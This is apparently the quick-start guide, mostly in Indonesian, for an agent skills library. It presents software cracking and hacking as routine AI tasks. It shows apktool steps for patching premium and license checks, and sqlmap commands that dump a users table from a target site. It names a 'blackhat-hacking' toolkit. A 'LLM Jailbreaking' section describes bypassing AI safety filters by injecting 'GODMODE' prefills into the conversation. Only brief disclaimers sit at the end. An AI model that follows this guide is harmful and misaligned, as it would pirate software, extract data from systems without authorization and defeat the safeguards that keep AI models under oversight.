# Quick Start Guide - OMP Enhanced

Panduan cepat untuk langsung pakai skills library ini.

## 🚀 Installation

### 1. Clone Repository
```bash
git clone <your-repo-url> omp-enhanced
cd omp-enhanced
```

### 2. Copy Skills ke Hermes Profile
```bash
# Default profile
cp -r skills/* ~/.hermes/skills/

# Specific profile (contoh: umi2)
cp -r skills/* ~/.hermes/profiles/umi2/skills/
```

### 3. Verify Installation
```bash
ls ~/omp-skills/
```

## 💡 Basic Usage

### Auto-Load (Recommended)
AI akan otomatis load skill yang relevan saat kamu mention task:

```
User: "Mod APK ini, bypass license check"
→ AI auto-loads: apk-modding-workflow, frida-runtime-hooking

User: "Buat PR untuk fitur login"
→ AI auto-loads: github/pr-workflow

User: "Test SQL injection di website ini"
→ AI auto-loads: sqlmap, web-pentesting-tools
```

### Manual Load
```python
# Load specific skill
skill_view(name='apk-modding-workflow')

# List skills in category
skills_list(category='security')
```

## 🎯 Common Tasks

### 1. APK Modding & Reverse Engineering

**Task:** Mod APK untuk unlock premium features

**Skills Used:**
- `apk-modding-workflow` - Complete workflow
- `frida-runtime-hooking` - Runtime bypass
- `android-16-apk-modding` - Android 16 specific

**Quick Commands:**
```bash
# Decompile
apktool d app.apk -o app_decompiled

# Find premium check
grep -r "premium\|isPremium\|checkLicense" app_decompiled/

# Rebuild
apktool b app_decompiled -o modded.apk

# Sign
uber-apk-signer -a modded.apk
```

### 2. SQL Injection Testing

**Task:** Test database security

**Skills Used:**
- `sqlmap` - Automated SQL injection
- `web-pentesting-tools` - Web security testing

**Quick Commands:**
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# Dump tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Extract data
sqlmap -u "http://target.com/page?id=1" -D db -T users --dump
```

### 3. GitHub Workflow

**Task:** Create feature branch & PR

**Skills Used:**
- `github/pr-workflow` - PR lifecycle
- `github/code-review` - Review automation

**Quick Commands:**
```bash
# New feature branch
git checkout -b feature/new-login

# Stage & commit
git add .
git commit -m "feat: add OAuth login"

# Push & create PR
git push -u origin feature/new-login
gh pr create --title "Add OAuth login" --body "Implements OAuth2 flow"
```

### 4. Document Automation

**Task:** Generate Word reports

**Skills Used:**
- `docx` - Word document manipulation
- `xlsx` - Excel spreadsheets

**Quick Commands:**
```python
from docx import Document

doc = Document()
doc.add_heading('Report Title', 0)
doc.add_paragraph('Content here')
doc.save('report.docx')
```

### 5. LLM Jailbreaking

**Task:** Bypass AI safety filters

**Skills Used:**
- `godmode` - GODMODE jailbreak
- `super-mod-brutal-prefills` - Brutal prefills

**Quick Usage:**
```
Load GODMODE prefill dari skill, inject ke conversation context
```

## 📚 Skill Categories Cheat Sheet

### Security (Offensive)
```
apk-modding-workflow      → APK reverse engineering
frida-runtime-hooking     → Runtime app bypass
sqlmap                    → SQL injection automation
web-pentesting-tools      → Web security testing
godmode                   → LLM jailbreaking
blackhat-hacking          → Complete hacking toolkit
```

### Development
```
github/pr-workflow        → PR creation & management
systematic-debugging      → Root cause debugging
test-driven-development   → TDD enforcement
python-debugpy            → Python debugging
node-inspect-debugger     → Node.js debugging
```

### Productivity
```
docx                      → Word documents
xlsx                      → Excel spreadsheets
pdf                       → PDF manipulation
notion                    → Notion integration
google-workspace          → Google Workspace API
```

### Creative
```
excalidraw                → Hand-drawn diagrams
ascii-art                 → ASCII art generation
popular-web-designs       → 54 design systems
songwriting-and-ai-music  → Music generation
```

## 🔧 Advanced Usage

### Combining Multiple Skills

**Example:** APK Modding + Frida Hooking

1. Decompile APK (`apk-modding-workflow`)
2. Identify protection checks
3. Write Frida script (`frida-runtime-hooking`)
4. Hook at runtime to bypass
5. Repackage & sign

**Example:** GitHub PR + Code Review

1. Create feature branch (`github/pr-workflow`)
2. Run automated review (`github/code-review`)
3. Fix issues
4. Create PR with clean diff

### Custom Workflows

Buat workflow sendiri dengan combine skills:

```python
# workflow.py
def apk_mod_pipeline(apk_path):
    # 1. Decompile
    skill_view('apk-modding-workflow')
    decompile(apk_path)
    
    # 2. Find targets
    targets = find_premium_checks()
    
    # 3. Patch
    patch_premium_checks(targets)
    
    # 4. Rebuild & sign
    rebuild_and_sign()
```

## 🐛 Troubleshooting

### Skill Not Found
```bash
# List available skills
ls ~/omp-skills/

# Install optional skill
hermes skills install <skill-name>
```

### Skill Outdated
```bash
# Update single skill
cd ~/.hermes/skills/category/skill-name
git pull

# Update all skills
cd omp-enhanced && git pull
cp -r skills/* ~/.hermes/skills/
```

### Python Compatibility Issues
```
Error: 'NoneType' object can't be awaited
→ Use Python 3.12 instead of 3.14
→ Or use sync alternatives instead of async
```

### APKTool Errors
```
Error: Invalid APK
→ Check Android version compatibility
→ Use latest APKTool 2.9.3+
→ Try different signing method
```

## 📖 Learn More

- **Full documentation:** README.md
- **Skill documentation:** `skills/category/skill-name/SKILL.md`
- **Examples:** `skills/category/skill-name/references/`

## 🎓 Best Practices

1. **Always verify skill content** before executing commands
2. **Read pitfalls section** untuk avoid common mistakes
3. **Update skills regularly** untuk latest workflows
4. **Combine skills** untuk complex tasks
5. **Document custom workflows** for future reuse

## 💬 Common Questions

**Q: Skill mana yang paling sering dipakai?**
A: Top 5: `apk-modding-workflow`, `github/pr-workflow`, `sqlmap`, `docx`, `godmode`

**Q: Bisa pakai di Windows/Linux/Mac?**
A: Ya, kebanyakan skills cross-platform. Beberapa tools butuh platform-specific (APKTool = Java, works everywhere)

**Q: Skill conflict dengan existing workflow?**
A: Skills hanya template/guidance, tidak override existing code. Bisa diabaikan jika tidak relevan.

**Q: Cara update skill yang outdated?**
A: `git pull` di omp-enhanced directory, lalu copy ulang ke Hermes profile.

**Q: Legal pakai security skills?**
A: Only pada sistem sendiri atau dengan permission. Unauthorized access = illegal.

## 🚨 Safety Reminders

- **APK Modding:** Violates app ToS, possible malware risk
- **SQL Injection:** Illegal pada unauthorized systems
- **Pentesting:** Requires explicit written permission
- **Jailbreaking:** Violates AI provider ToS

**Educational purposes only. Use responsibly.**

---

**Next Steps:**
1. Browse `skills/` directory
2. Read SKILL.md files yang relevan
3. Try basic tasks dari list di atas
4. Build custom workflows

Happy hacking! 🎉
